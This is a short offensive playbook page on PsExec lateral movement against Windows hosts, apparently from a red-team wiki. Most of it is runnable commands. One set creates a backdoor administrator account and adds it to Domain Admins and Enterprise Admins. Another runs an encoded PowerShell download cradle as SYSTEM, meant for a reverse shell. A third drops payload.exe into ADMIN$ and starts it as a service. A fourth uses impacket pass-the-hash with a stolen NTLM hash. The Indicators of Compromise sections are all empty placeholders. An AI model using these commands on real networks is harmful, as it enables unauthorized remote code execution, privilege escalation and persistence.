# PsExec
## Summary

PsExec is a light-weight telnet-replacement that lets you execute processes on other Windows systems, complete with full interactivity for console applications, without having to manually install client software.

## Prerequisites

The target must be a Windows based operating system, and the C$ or ADMIN$ share (or equivalent share into C:\\Windows\\System32) must be *writable*. If a network share is not available, see [MOF Upload](./mof_upload.md), an alternative to PsExec.

## Setup

To set up, either obtain and utilize Administrator credentials to the share(s) in question, or make them writable by modifying user permissions in the Sharing tab on windows. To create a user that can access C$ or ADMIN$, use the following command as Administrator:

```cmd
net user kevin.beacon securepassword /add
net localgroup Administrators kevin.beacon /add
```

If within an active directory environment, you may add the user to either "Domain Admins" for the current tree in the forest, or "Enterprise Admins" for the entire forest.

```cmd
net group "Domain Admins" kevin.beacon /add /domain
net group "Enterprise Admins" kevin.beacon /add /domain
```

## Execution

### Method 1 - Sysinternals

From a Windows client, the [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) suite can be used to execute arbitrary programs on the target machine. Use `-s` to run the command as NT AUTHORITY\\SYSTEM, and use `-i` to make it interactive, though this will almost certainly break in a reverse shell. Though, using this flag also gives some useful output even when spawning a reverse shell through PsExec, which is why it is listed below.

```cmd
.\psexec.exe -accepteula -u user -p password -s -i \\remote.server.com cmd /c %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -enc <base64 encoded cradle>
```

#### Indicators of Compromise

TODO

### Method 2 - Manually PsExecing with SC

From a Windows client, upload the binary you wish to execute on the target and start a remote service with the following commands (there is supposed to be a space after binPath):

```cmd
copy payload.exe \\remote.server.com\ADMIN$
sc \\remote.server.com create servicename binPath= "C:\Windows\payload.exe"
sc \\remote.server.com start servicename
```

#### Indicators of Compromise

TODO

### Method 3 - Impacket-PsExec

The impacket library was created in python, so as long as python and impacket are installed, this should work from any OS that supports python.

```bash
impacket-psexec DOMAIN/USERNAME:'PASSWORD'@target
```

If you do not have or know the password, but you do have the NTLM hash, then impacket also supports Pass The Hash (Only place the part of the hash after the colon in this command):

```bash
impacket-psexec -hashes :NTHASH DOMAIN/USERNAME@target
```

#### Indicators of Compromise

TODO